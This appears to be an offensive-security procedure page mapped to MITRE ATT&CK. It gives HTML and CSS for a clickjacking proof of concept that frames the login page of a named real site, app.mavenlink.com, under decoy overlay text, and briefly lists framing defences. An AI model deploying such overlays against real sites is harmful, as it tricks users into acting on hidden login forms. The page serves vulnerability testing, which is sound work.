---
id: proc-create-clickjacking-test
tags:
  - clickjacking
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:05.071Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-Test-Page

## Summary

This procedure creates a simple HTML file to test for clickjacking vulnerability by embedding the target login page in a semi-transparent iframe overlaid on custom content.

## Description

Clickjacking exploits the lack of frame-busting protections like X-Frame-Options headers, allowing attackers to overlay invisible or semi-transparent iframes on malicious pages. In this scenario, targeting https://app.mavenlink.com/login, the procedure builds a proof-of-concept HTML page that demonstrates the site's susceptibility to being framed, setting the stage for phishing or CSRF attacks where users unwittingly interact with the hidden form.

## Requirements

1. Text editor (e.g., VS Code, Notepad)
2. Web browser for later testing
3. Knowledge of basic HTML and CSS

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN headers on all pages
- Use Content-Security-Policy (CSP) frame-ancestors directive to restrict framing
- Monitor for unusual iframe embeddings in web traffic logs

## Objectives

1. Generate a test HTML file confirming iframe embeddability
2. Visualize the vulnerability through overlay styling
3. Prepare for exploitation demonstration

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Create the basic HTML skeleton with an iframe sourcing the target URL.

**Code**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
</head>
<body>
    <h1>This site is vulnerable to Clickjacking!</h1>
    <iframe src="https://app.mavenlink.com/login" style="opacity: 0.5; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;"></iframe>
</body>
</html>
```

> Save as 'pen-test-for-clickjacking.html'. The iframe loads the login page with reduced opacity and negative z-index to overlay behind the warning text.

### Step 2: Style for Overlay Demonstration

**Context**: Apply CSS to make the iframe semi-transparent and positioned to simulate a malicious overlay.

**Code**:
```html
<style>
    iframe {
        opacity: 0.5;
        position: absolute;
        top: 50px;
        left: 50px;
        width: 400px;
        height: 300px;
        z-index: 1;
        border: 1px solid red;
    }
    .overlay-text { position: relative; z-index: 2; }
</style>
<div class="overlay-text">Click here to login (but you're actually clicking the framed form!)</div>
```

> This adds visible overlay text, tricking users into interacting with the framed login fields below.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[web-vulnerability]]
